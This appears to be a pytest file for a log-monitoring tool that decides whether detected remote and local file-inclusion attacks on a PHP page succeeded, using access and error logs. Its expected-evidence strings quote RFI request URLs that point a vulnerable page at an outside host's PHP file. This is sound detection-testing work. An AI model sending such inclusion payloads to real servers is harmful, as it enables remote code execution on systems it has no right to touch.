from datetime import timedelta
from pathlib import Path

import pytest

from logsentry.outcome import read_error_log, verdict
from logsentry.parsers.nginx import parse_line
from logsentry.rules.web_attack import WebAttack

FIXTURES = Path(__file__).parent / "fixtures"
WINDOW = timedelta(seconds=10)
USUAL = {"/rfi/view.php": 2}
ACCESS: dict[str, list] = {}
for raw in (FIXTURES / "apache_access_rfi.log").read_text().splitlines():
    if e := parse_line(raw):
        ACCESS.setdefault(str(e.src_ip), []).append(e)
ERRORS, MALFORMED = read_error_log(FIXTURES / "apache_error_rfi.log")
PATTERNS = Path(__file__).parent.parent / "config" / "web_patterns.yaml"


def first_alert(events):
    """The alert a fresh rule raises for the first request (rules keep per-IP state)."""
    config = WebAttack.Config.model_validate({"patterns_file": PATTERNS, "group_gap_seconds": 1800})
    (alert,) = WebAttack(config).process(events[0])
    return alert


def judge(ip: str, errors=ERRORS, usual=USUAL):
    events = ACCESS[ip]
    alert = first_alert(events)
    return verdict(alert, events, errors, WINDOW, usual)


def test_malformed_lines_are_counted():
    assert (len(ERRORS), MALFORMED) == (7, 1)


def test_failed_rfi_matches_by_url_in_local_time():
    # request 12:49:40 -0400, warning 12:49:44 with no zone: only lines up if the offset is applied
    alert = judge("203.0.113.22")
    assert alert.outcome == "failed"
    assert alert.outcome_evidence[:2] == [
        "12:49:40 /rfi/view.php?page=http://198.51.100.5/dataex.php: failed",
        "  error_log (URL match): HTTP request failed! HTTP/1.1 404 Undescribed",
    ]
    assert len([e for e in alert.outcome_evidence if "198.51.100.5/dataex.php" in e]) == 3
    assert alert.outcome_evidence[-1] == "  response 731 B vs usual 2 B for /rfi/view.php"


def test_size_contradicting_a_failure_is_flagged():
    alert = judge("203.0.113.22", usual={"/rfi/view.php": 731})
    assert alert.outcome_evidence[-1].endswith("(contradicts the verdict)")


@pytest.mark.parametrize("ip", ["203.0.113.23", "203.0.113.24"])  # RFI 302, LFI 200
def test_no_include_error_in_covered_window_means_succeeded(ip):
    alert = judge(ip)
    assert alert.outcome == "succeeded"
    assert alert.outcome_evidence[1] == "  error_log: no error logged within 10 s of the request"


def test_error_log_ending_soon_after_the_request_still_covers_it():
    alert = judge("203.0.113.28")  # 13:13:10, the error_log's last line is 13:13:14
    assert alert.outcome == "succeeded"
    assert "  error_log ends 4 s after the request" in alert.outcome_evidence


def test_error_log_ending_before_the_request_is_unknown():
    alert = judge("203.0.113.25")
    assert alert.outcome == "unknown"
    assert alert.outcome_evidence[1] == "  error_log doesn't cover the time of the request"


def test_non_php_script_is_unknown():
    # a Perl CGI never writes PHP warnings, so a quiet error_log proves nothing
    alert = judge("203.0.113.26")
    assert alert.outcome == "unknown"
    assert "isn't a PHP script" in alert.outcome_evidence[1]


def test_one_success_in_a_burst_makes_the_alert_succeeded():
    alert = judge("203.0.113.27")  # fail.php failed, win.php (suppressed by cooldown) worked
    assert alert.outcome == "succeeded"
    headers = [e for e in alert.outcome_evidence if not e.startswith("  ")]
    assert headers == [
        "13:06:00 /rfi/view.php?page=http://198.51.100.5/fail.php: failed",
        "13:07:00 /rfi/view.php?page=http://198.51.100.5/win.php: succeeded",
    ]


def test_all_failed_burst_is_failed_and_evidence_is_capped():
    events = ACCESS["203.0.113.22"] * 10
    alert = first_alert(events)
    alert = verdict(alert, events, ERRORS, WINDOW, USUAL)
    assert alert.outcome == "failed"
    assert len(alert.outcome_evidence) == 25
    assert alert.outcome_evidence[-1].endswith("more line(s) not shown")


def test_no_error_log_is_unknown_even_with_a_telling_size():
    alert = judge("203.0.113.22", errors=None)
    assert alert.outcome == "unknown"
    assert alert.outcome_evidence[1:] == [
        "  no error_log given",
        "  response 731 B vs usual 2 B for /rfi/view.php",
    ]


def test_no_inclusion_requests_leave_the_alert_unchanged():
    # the caller passes only the RFI / traversal requests; an XSS-only alert has none
    alert = first_alert(ACCESS["203.0.113.22"])
    assert verdict(alert, [], ERRORS, WINDOW, USUAL) is alert
